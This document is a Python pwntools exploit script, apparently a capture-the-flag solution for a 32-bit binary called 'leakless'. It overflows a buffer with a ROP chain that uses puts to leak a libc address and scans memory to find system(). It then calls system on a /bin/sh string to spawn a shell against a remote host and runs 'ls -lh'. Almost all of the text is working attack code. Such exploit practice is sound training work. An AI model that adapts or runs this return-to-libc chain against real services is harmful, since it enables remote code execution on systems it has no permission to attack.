from pwn import *

elf = ELF("./leakless")
plt_puts = elf.plt['puts']
plt_read = elf.plt['read']
plt_exit = elf.plt['exit']
addr_vuln = elf.symbols['feedme']
got_puts = elf.got['puts']
offset_system = 0x66f10 - 0x3ee90
offset_binsh = 0x17fb95 - 0x66f10
addr_bss = elf.bss()

def write():
    payload = "A" * 0x4c
    payload += p32(plt_read)
    payload += p32(addr_vuln)
    payload += p32(0)
    payload += p32(addr_bss)
    payload += p32(8)
    sock.send(payload)
    sock.recv(4, timeout = 1)
    sock.send("/bin/sh\x00")

def leak(address):
    payload = "A" * 0x4c
    payload += p32(plt_puts)
    payload += p32(addr_vuln)
    payload += p32(address)
    sock.send(payload)
    data = sock.recv(4096)
    if data == '\n':
        return "\x00"
    print(hex(address), repr(data[:8]))
    return data[:4]

def shell(system, binsh):
    payload = "A" * 0x4c
    payload += p32(system)
    payload += p32(plt_exit)
    payload += p32(binsh)
    sock.send(payload)
    sock.send("ls -lh")
    print(sock.recv(4096))
    print(sock.recv(4096))
    print(sock.recv(4096))
    print(sock.recv(4096))

def get_libc(sock):
    #write()
    #print("[+] /bin/sh: " + hex(addr_bss))
    libc_puts = u32(leak(got_puts))
    print("[+] puts: " + hex(libc_puts))
    libc_system = libc_puts - offset_system - 0x40
    while True:
        if leak(libc_system) == '\x57\x56\x53\x8b':
            print("[+] Found system: " + hex(libc_system))
            break
        libc_system += 0x10
    print(repr(leak(libc_system)))
    print(repr(leak(libc_system + 4)))
    print(repr(leak(libc_system + 8)))
    
    shell(libc_system, addr_bss)

sock = process("./leakless")
sock = remote("51.68.189.144", 31007)
libc = get_libc(sock)

